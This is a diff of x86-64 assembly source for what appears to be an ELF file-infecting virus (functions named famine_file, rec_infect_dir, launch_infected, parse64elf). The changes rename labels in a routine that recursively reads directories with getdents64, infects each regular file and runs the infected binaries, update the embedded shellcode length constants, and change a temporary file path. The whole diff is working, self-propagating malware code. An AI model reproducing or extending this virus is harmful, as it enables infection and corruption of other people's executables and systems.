@@ -571,7 +571,7 @@ rec_infect_dir:
 	cmp rax, -1
 	je exit_prog ;open error
  	mov [rsp], rax
-	dir_read_loop:
+	rec_read_loop:
 		mov rdi, [rsp];fd of dir
 		lea rsi, [rsp + 4]; addr of buffer
 		mov rdx, 1024;reading max 1024 bytes
@@ -580,32 +580,32 @@ rec_infect_dir:
 		cmp rax, -1
 		je exit_prog;getdents64 err
 		cmp rax, 0
-		je dir_read_exit; done reading dir
+		je rec_read_exit; done reading dir
 		mov r10, rax; store number bytes read
 		xor rcx, rcx; will serve as index to parse files
-		parse_file_loop:
+		rec_parse_file_loop:
 			mov r8, rsi; save rsi
 			lea r9, [rsi + rcx] ; current linux_dirent64*
 			lea rsi, [r9 + 19];filename
 			cmp byte[r9 + 18], 	REGULAR_FILE ; [r9 +18] is file type
-			jne skip_file
+			jne rec_skip_file
 			mov rdi, rsi; pass fname as arg
 			call famine_file ; void famine_file(char * fname);
 			cmp r11, 0
-			je skip_file; we still need to find a file able to infect others
+			je rec_skip_file; we still need to find a file able to infect others
 			mov rdi, [r9 + 19];filename
 			call launch_infected
-			skip_file: 
+			rec_skip_file: 
 			mov rsi, r8
 			xor rdx, rdx
 			mov dx, WORD[r9 + 16] ;len of current linux_dirent64*
 			add rcx, rdx
 			cmp rcx, r10
-			jae parse_file_exit
-			jmp parse_file_loop
-		parse_file_exit: 
-		jmp dir_read_loop
-	dir_read_exit:
+			jae rec_parse_file_exit
+			jmp rec_parse_file_loop
+		rec_parse_file_exit: 
+		jmp rec_read_loop
+	rec_read_exit:
 	add rsp, 4
 	add rsp,1024
 		
@@ -965,9 +965,9 @@ push rdx
 	pop rcx
 retn
 
-%define SHELLCODE_LEN 6226 ; 44 + 5 (jmp) + 12 (exit) + signature (39)
-%define SHELLCODE_JMP_INDEX 6175 ; 44 + 5 (jmp)
-%define PURE_SHELLCODE_LEN 6170 
+%define SHELLCODE_LEN 6449 ; 44 + 5 (jmp) + 12 (exit) + signature (39)
+%define SHELLCODE_JMP_INDEX 6398 ; 44 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 6393 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	sub rsp, 8
@@ -1763,7 +1763,7 @@ push rdi
 	;OPEN SC FILE
 	push rdi
 	mov rax, 2
-	mov rdi, 0x0063732f706d742f ; "/tmp/sc"
+	mov rdi, 0x0063632f706d742f ; "/tmp/cc"
 	push rdi
 	lea rdi, [rsp]
 	xor rsi, rsi
